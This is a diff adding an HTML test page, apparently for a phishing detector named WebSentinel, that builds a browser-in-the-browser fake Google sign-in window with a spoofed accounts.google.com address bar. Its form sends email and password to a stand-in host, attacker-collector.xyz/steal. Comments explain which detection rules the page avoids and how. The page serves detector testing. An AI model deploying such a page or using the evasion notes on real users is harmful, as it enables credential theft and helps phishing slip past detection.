@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<!--
+  WebSentinel — BitB Anomaly Score Test Page (50%)
+  EDUCATIONAL / RESEARCH USE ONLY
+
+  L1 target heuristic: 0.50
+  Triggers:
+    Rule 2 (+0.20): z-index: 99999 on the overlay <div>
+    Rule 5 (+0.30): <span class="browser-bar"> in the address pill
+  Does NOT trigger:
+    Rule 1 — overlay is a <div>, NOT <iframe style="...position:fixed">
+    Rule 3 — background uses min-height/min-width in px; no 100vw+100vh pair
+    Rule 4 — no ondragstart/onselectstart/user-select:none anywhere
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Google - Sign in</title>
+  <link rel="icon" href="https://accounts.google.com/favicon.ico"/>
+  <style>
+    /* NOTE: NO user-select:none anywhere in this stylesheet (Rule 4 avoidance) */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #f1f3f4;
+      font-family: 'Google Sans', Arial, sans-serif;
+      /* NO user-select:none, NO overflow:hidden that could pair with 100vw/100vh */
+    }
+
+    /* Background page — uses explicit pixel-based sizing to avoid Rule 3.
+       Rule 3 fires if "width:100(vw|%)" AND "height:100(vh|%)" BOTH appear in DOM.
+       Using min-height/min-width with no 100% height on body is safe. */
+    .bg-page {
+      min-width: 900px;
+      min-height: 700px;
+      background: linear-gradient(135deg, #f8f9fa 0%, #e8eaed 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #5f6368;
+      font-size: 14px;
+    }
+
+    /*
+      Fake browser window overlay.
+      Uses position:fixed on a <div> — this does NOT trigger Rule 1.
+      Rule 1 requires the pattern inside an <iframe style="..."> attribute specifically.
+      z-index:99999 triggers Rule 2 (+0.20).
+      Width/height in px — no 100vw/100vh pair (Rule 3 avoidance).
+    */
+    .fake-browser-window {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 460px;
+      height: 560px;
+      z-index: 99999;        /* RULE 2: +0.20 */
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 20px 64px rgba(0,0,0,0.35);
+      background: #fff;
+    }
+
+    /* Fake browser chrome: title bar */
+    .fake-titlebar {
+      background: #e8eaed;
+      display: flex;
+      align-items: center;
+      padding: 7px 12px;
+      gap: 8px;
+      border-bottom: 1px solid #dadce0;
+      height: 42px;
+    }
+
+    /* macOS-style traffic light buttons (decorative) */
+    .traffic-light { display: flex; gap: 6px; flex-shrink: 0; }
+    .tl-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+    .tl-red    { background: #ff5f57; }
+    .tl-amber  { background: #febc2e; }
+    .tl-green  { background: #28c840; }
+
+    /* Address bar pill */
+    .address-pill {
+      flex: 1;
+      background: #fff;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      padding: 4px 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #202124;
+      height: 28px;
+    }
+
+    .lock-icon { color: #188038; font-size: 11px; flex-shrink: 0; }
+
+    /*
+      RULE 5 TRIGGER (+0.30): class="browser-bar"
+      Regex "browser.*bar" matches the string "browser-bar" (. matches -)
+    */
+    .browser-bar {
+      flex: 1;
+      font-size: 12px;
+      color: #202124;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Google-branded phishing form area */
+    .login-panel {
+      padding: 32px 40px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .google-logo {
+      font-size: 22px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+    .google-logo .g1 { color: #4285f4; }
+    .google-logo .g2 { color: #ea4335; }
+    .google-logo .g3 { color: #fbbc05; }
+    .google-logo .g4 { color: #4285f4; }
+    .google-logo .g5 { color: #34a853; }
+    .google-logo .g6 { color: #ea4335; }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 6px;
+    }
+
+    .subheading {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 28px;
+    }
+
+    .input-group {
+      width: 100%;
+      margin-bottom: 18px;
+    }
+
+    .input-group input {
+      width: 100%;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 13px 15px;
+      font-size: 14px;
+      color: #202124;
+      outline: none;
+      font-family: inherit;
+    }
+
+    .input-group input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+    }
+
+    .btn-row {
+      width: 100%;
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 4px;
+    }
+
+    .btn-next {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .btn-next:hover { background: #1557b0; }
+
+    .disclaimer {
+      font-size: 10px;
+      color: #9aa0a6;
+      text-align: center;
+      margin-top: 22px;
+    }
+  </style>
+</head>
+<!-- NO ondragstart / onselectstart attributes on body — Rule 4 must NOT fire -->
+<body>
+
+  <!-- Background: legitimate-looking page behind the overlay -->
+  <div class="bg-page">
+    <p>Loading Google services...</p>
+  </div>
+
+  <!--
+    BitB overlay: a <div> (NOT an <iframe>) with z-index:99999
+    Rule 1 requires <iframe style="...position:fixed">, so a <div> is safe.
+  -->
+  <div class="fake-browser-window">
+
+    <!-- Fake browser titlebar with address pill -->
+    <div class="fake-titlebar">
+      <div class="traffic-light">
+        <span class="tl-dot tl-red"></span>
+        <span class="tl-dot tl-amber"></span>
+        <span class="tl-dot tl-green"></span>
+      </div>
+      <div class="address-pill">
+        <span class="lock-icon">&#128274;</span>
+        <!-- RULE 5 TRIGGER: class="browser-bar" matches regex "browser.*bar" -->
+        <span class="browser-bar">https://accounts.google.com/o/oauth2/v2/auth</span>
+      </div>
+    </div>
+
+    <!-- Google-themed phishing form -->
+    <div class="login-panel">
+      <div class="google-logo">
+        <span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span>
+      </div>
+      <h2>Sign in</h2>
+      <p class="subheading">to continue to Google Account</p>
+
+      <form action="http://attacker-collector.xyz/steal" method="POST">
+        <input type="hidden" name="campaign" value="bitb-anomaly-50"/>
+        <div class="input-group">
+          <input type="email" name="email"
+                 placeholder="Email or phone" autocomplete="off"/>
+        </div>
+        <div class="input-group">
+          <input type="password" name="password"
+                 placeholder="Enter your password" autocomplete="off"/>
+        </div>
+        <div class="btn-row">
+          <button type="submit" class="btn-next">Next</button>
+        </div>
+      </form>
+
+      <p class="disclaimer">
+        [WebSentinel Test Page — L1 Target: 0.50 — Not a real Google page]
+      </p>
+    </div>
+
+  </div>
+
+  <!--
+    No iframe with position:fixed (Rule 1 would fire).
+    No drag-prevention attributes or CSS (Rule 4 must stay silent).
+  -->
+
+</body>
+</html>
